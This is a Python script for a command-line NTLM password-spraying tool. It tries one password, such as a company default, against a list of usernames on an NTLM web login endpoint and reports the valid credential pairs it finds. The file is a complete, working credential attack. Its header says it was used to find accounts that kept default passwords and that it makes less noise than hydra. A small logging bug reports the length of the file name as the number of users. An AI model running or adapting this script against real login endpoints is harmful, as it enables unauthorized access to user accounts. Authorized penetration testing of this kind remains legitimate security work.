#!/usr/bin/env python3
######################################################################################
# ntlm_passwordspray.py - Simple Password sprayer for NTLM (web-)endpoints.
#
# I used this to throw a company standard password at enumerated user accounts
# on a NTLM weblogin endpoint to where it sticks. Aka what users did not change their
# default credentials as they were told to do...
#
# You _could_ use hydra for this, but this way I had more control over the process,
# as hydra tends to make alot of noise.
#####################################################################################

import requests
from requests_ntlm import HttpNtlmAuth
import sys
import getopt


class NTLMSprayer:
    def __init__(self, fqdn):
        self.HTTP_AUTH_FAILED_CODE = 401
        self.HTTP_AUTH_SUCCEED_CODE = 200
        self.verbose = True
        self.fqdn = fqdn

    def load_users(self, userfile):
        # load the contents of userfile into a list:
        self.users: list = []
        lines = open(userfile, 'r', encoding="utf-8").readlines()
        for line in lines:
            self.users.append(line.replace("\r", "").replace("\n", ""))
        print(f"[=] Loaded wordlist {userfile} for: {len(userfile)} items.\n")

    def password_spray(self, password, url):
        print("[i] Starting NTLM password spray attack using the following password: " + password)
        count = 0
        for user in self.users:
            response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password))
            if response.status_code == self.HTTP_AUTH_SUCCEED_CODE:
                print("[+] Valid credential pair found! Username: " + user + " Password: " + password)
                count += 1
                continue
            if self.verbose:
                if response.status_code == self.HTTP_AUTH_FAILED_CODE:
                    print("[-] Failed login with Username: " + user)
        print("[*] Password spray attack completed, " + str(count) + " valid credential pairs found")


def main(argv):
    userfile = ''
    fqdn = ''
    password = ''
    attackurl = ''

    # use getopt for command line parameter collection:
    try:
        opts, args = getopt.getopt(argv, "hu:f:p:a:", ["userfile=", "fqdn=", "password=", "attackurl="])
    except getopt.GetoptError:
        print("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
        sys.exit(2)

    for opt, arg in opts:
        if opt == '-h':
            print("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
            sys.exit()
        elif opt in ("-u", "--userfile"):
            userfile = str(arg)
        elif opt in ("-f", "--fqdn"):
            fqdn = str(arg)
        elif opt in ("-p", "--password"):
            password = str(arg)
        elif opt in ("-a", "--attackurl"):
            attackurl = str(arg)

    if len(userfile) > 0 and len(fqdn) > 0 and len(password) > 0 and len(attackurl) > 0:
        # All set, start the attack:
        sprayer = NTLMSprayer(fqdn)
        sprayer.load_users(userfile)
        sprayer.password_spray(password, attackurl)
        sys.exit()
    else:
        # Nay, something looks fishy, print usage and exit...
        print("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
        sys.exit(2)


if __name__ == "__main__":
    main(sys.argv[1:])
